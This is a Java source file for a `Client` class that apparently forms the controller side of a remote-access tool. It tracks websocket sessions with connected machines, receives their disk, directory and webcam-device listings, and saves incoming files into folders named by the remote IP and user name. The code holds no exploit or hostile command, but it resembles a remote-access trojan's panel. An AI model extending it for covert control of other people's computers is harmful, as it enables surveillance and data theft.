package Connections;

import GUI.TableUtils.FileManager.FileManagerGUI;
import Information.NetworkInformation;
import Information.Response;
import Information.SystemInformation;
import Information.Time;
import org.json.JSONObject;
import org.eclipse.jetty.websocket.api.Session;

import java.io.IOException;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class Client {
    private Session session;
    private SystemInformation sysInfo;
    private NetworkInformation netInfo;
    ExecutorService executor = Executors.newCachedThreadPool();
    public Updater updater;

    public UniqueByteIDGenerator uniqueByteIDGenerator = new UniqueByteIDGenerator();
    Map<Response, Consumer<JSONObject>> mapOfResponses = new HashMap<>();

    ConcurrentHashMap<Byte, BytesChannel> activeChannels = new ConcurrentHashMap<>();

    public ConcurrentHashMap<Byte, BytesChannel> getFileChannels() {
        return activeChannels;
    }

    public Client(Session session) {
        this.session = session;
        updater = new Updater(this);
        setupMapOfResponses();
    }

    public BytesChannel createFileChannel(Category category) {
        byte id = uniqueByteIDGenerator.getID();
        BytesChannel channel = new BytesChannel(id, category);
        activeChannels.put(id, channel);
        return channel;
    }

    public BytesChannel getChannelById(byte id) {
        return activeChannels.get(id);
    }

    public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
        switch (bytesChannel.getCategory()) {
            case ZIP_FILE -> writeFile(finalData, bytesChannel.getCategoryOutputFolder());
            case IMAGE -> {
                bytesChannel.getBuffer().clear();
                System.out.println("!!");
            }
        }
        // closeFileChannel(bytesChannel.getId());
    }


    // Cierra un FileChannel y libera su ID
    public void closeFileChannel(byte id) {
        activeChannels.remove(id);
        uniqueByteIDGenerator.finishTask(id);
    }


    private void setupMapOfResponses() {
        mapOfResponses.put(Response.SYS_NET_INFO, updater::addRowOfNewConnection);
        mapOfResponses.put(Response.DISKS, updater::updateDisks);
        mapOfResponses.put(Response.DIRECTORY, updater::updateDirectory);
        mapOfResponses.put(Response.WEBCAM_DEVICES, updater::updateWebcamDevices);
    }


    public void processMessage(String message) {

        JSONObject object = new JSONObject(message);
        Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
        if (action != null) {
            action.accept(object);
        } else {
            System.out.println("Action not found!");
        }
    }

    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }


    public void sendString(String message) throws IOException {
        session.getRemote().sendString(message);
    }

    public void processMessage(byte[] message) {

    }

    public String getUUID() {
        return sysInfo.UUID();
    }

    public String getIdentifier() {
        return netInfo.IP() + " - " + sysInfo.USER_NAME();
    }

    public void sendMessage(String message) throws IOException {
        session.getRemote().sendString(message);
    }

    public void writeFile(byte[] data, String category) {
        String finalNameOfFolder = category + " - " + new Time().getTime();
        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
        executor.execute(task);
    }

    public void setFileManagerGUI(FileManagerGUI fileManagerGUI) {
        updater.setFileManagerGUI(fileManagerGUI);
    }

    public void setSysInfo(SystemInformation sysInfo) {
        this.sysInfo = sysInfo;
    }

    public void setNetInfo(NetworkInformation netInfo) {
        this.netInfo = netInfo;
    }

    public SystemInformation getSysInfo() {
        return sysInfo;
    }

    public NetworkInformation getNetInfo() {
        return netInfo;
    }

    public ExecutorService getExecutor() {
        return executor;
    }


}
